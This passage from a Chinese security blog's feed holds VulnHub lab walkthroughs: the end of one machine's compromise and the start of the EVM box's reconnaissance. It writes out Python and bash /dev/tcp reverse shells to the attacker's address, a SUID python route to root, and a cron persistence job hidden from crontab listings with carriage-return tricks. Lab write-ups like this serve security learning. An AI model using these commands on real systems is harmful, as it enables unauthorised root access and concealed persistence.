&lt;h3 id=&#34;issri-攻击-irc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#issri-攻击-irc&#34;&gt;#&lt;/a&gt; issri 攻击 irc&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;修改防火墙规则，允许链接 irc&lt;br&gt;
 在 www-data 用户的时候，发现可以直接调用 root 改变 iptables&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前的防火墙规则&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo iptables -L&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;同由于它是一个易受攻击的机器，我们看到我们从外部发送到irc的包通过使,用授予所有用户的管理 iptables 的权限被丢弃，我们删除了这个丢弃规则。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重写第二条规则以允许端口 6667 上的 TCP 连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo iptables -R INPUT 2 -p tcp --dport 6667 -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo iptables -L&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;而在nmap扫描端口时也出现了 6667 irc服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;改变iptables之后我们可以通过irssi连接到irc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-178.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;issri 连接至 irc&lt;br&gt;
 &lt;code&gt;irssi -c 192.168.31.5 -p 6667 列出频道 /list&lt;/code&gt; &lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-179.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;加入了 wallabyschat 频道 /join #wallabyschat&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-180.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列出选项 .help&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-181.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看私密信息 /window 3&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-182.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;看到 run 似乎有用，返回 /window 2, 执行 run&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-183.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;只有 waldo 才能执行，我们换名字 /nick waldo&lt;br&gt;
 此时更名不成功，因为正有 waldo 用户的进程 tmux 使用着&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;伪造身份登陆 irssi&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;通过sudo -l中的vim权限设置错误提升权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;esc --&amp;gt; :!/bin/bash 提权至waldo权限&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-184.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;这里有一个irssi.sh的文件，会以waldo的身份运行shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;他的设置有问题。如果 Tmux 宕机，他的 IRC 连接也会宕机。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pkill tmux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;who&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-185.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;
&lt;p&gt;在 irssi 中修改别名为 waldo：/nick waldo&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-186.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现在我们用 waldo 身份来运行 run 看会有什么效果&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-187.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;suid-python提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-python提权&#34;&gt;#&lt;/a&gt; SUID python 提权&lt;/h3&gt;
&lt;p&gt;可以看到的是，我们用 run 执行命令的时候调用的是 wallabyshot 的身份&lt;br&gt;
我们可以构造 payload 尝试将 wallabyshot 身份的 shell 反弹出来&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这是一个python反弹shell的代码，尝试运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.run python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31.135 &amp;quot;,4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-188.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;作为 waldo，我运行 .run 并从机器人收到 FileNotFound 错误。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;FileNotFoundError: [Errno 2] No such file or directory: &amp;#x27;None&amp;#x27; (file &amp;quot;/usr/lib/python3.5/subprocess.py&amp;quot;, line 1551, in _execute_child)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;adm 组确实看起来很有希望。由于 .run 需要一个文件，因此我创建了一个包含以下内容的文件：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用具有s权限的python进行提权, 修改下一个脚本以将 suid 位应用于 python 可执行文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo chmod 4777 /usr/bin/python2.7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 irssi 执行此脚本，将 python2.7 添加上 SUID 权限&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-189.png&#34; width=&#34;270&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;此后可以退出 irssi 了 /quit&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ls - al /usr/bin/python2.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import os; os.setuid(0); os.system(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-190.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提权成功拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;隐蔽cron权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#隐蔽cron权限维持&#34;&gt;#&lt;/a&gt; 隐蔽 cron 权限维持&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前计划任务有哪些&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;crontab -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /root/.first.sh &amp;lt;&amp;lt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /root/.second.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(crontab -l;printf &amp;quot;*/1 * * * * /root/.first.sh;\rno crontab for `whoami`%100c\n&amp;quot;)|crontab -&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;*/1 * * * *：每隔 1 分钟执行一次；&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/r：&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt;默认支持 \r 回车符 \n 换行符 \f 换页符这些符号，会导致显示截断隐藏命令，隐藏真实的计划任务；&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;%100c：格式化输出一个字符，前面 99 个空格补齐。使用空格帮助我们把前面的内容在 crontab 中遮盖掉；&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果想让创建的文件隐蔽性更强，可以创建名为&lt;span class=&#34;string&#34;&gt;&amp;quot;..&amp;quot;&lt;/span&gt;、“...”或以..等开头的文件。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 .first.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 .second.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/root/.second.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-191.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果发现无法运行，可以通过下列两个命令查看详细计划任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /var/spool/cron/crontabs/root -A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;crontab -e 或者 vi /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在kali机器上监听 4444 端口，每隔一分钟收到将会一次shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc - lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行一下命令产生一个标准的shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-192.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 只要开启 kali 的 4444 端口，很快就会收到 root 账户的 shell&lt;/p&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/101%20EVM/</id>
        <title>VULNHUB 1 EVM</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/101%20EVM/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZXZtLTEsMzkxLw==&#34;&gt;https://www.vulnhub.com/entry/evm-1,391/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpdmVyMTAwZGF5L2FydGljbGUvZGV0YWlscy8xMTkyNzY3OTc=&#34;&gt;https://blog.csdn.net/liver100day/article/details/119276797&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI：192.168.31.135&lt;br&gt;
 靶机 EVM：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-000.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3）去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-001.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.155&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A - p 1-1024 192.168.31. 155 - oN /tmp/evm.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-002.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;wordpress渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress渗透&#34;&gt;#&lt;/a&gt; wordpress 渗透&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTU1&#34;&gt;http://192.168.31.155&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;观察页面可知存在网址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy8=&#34;&gt;http://192.168.31.155/wordpress/&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-003.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对此网站进行目录扫描&lt;br&gt;
 &lt;code&gt;dirsearch -u [http://192.168.31.155](http://192.168.31.155)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-004.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy8=&#34;&gt;http://192.168.31.155/wordpress/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy93cC1sb2dpbi5waHA=&#34;&gt;http://192.168.31.155/wordpress/wp-login.php&lt;/span&gt;&lt;br&gt;
-&amp;gt; 对 wordpress 网站渗透扫描&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;获取到 wpscan 的 api token：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93cHNjYW4uY29tL3Byb2ZpbGU/cHJpY2luZ0xpc3Q9MQ==&#34;&gt;https://wpscan.com/profile?pricingList=1&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过以下命令枚举wordpress的用户名：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.155/wordpress/ --enumerate u --api-token&lt;/span&gt;&lt;br&gt;&lt;span 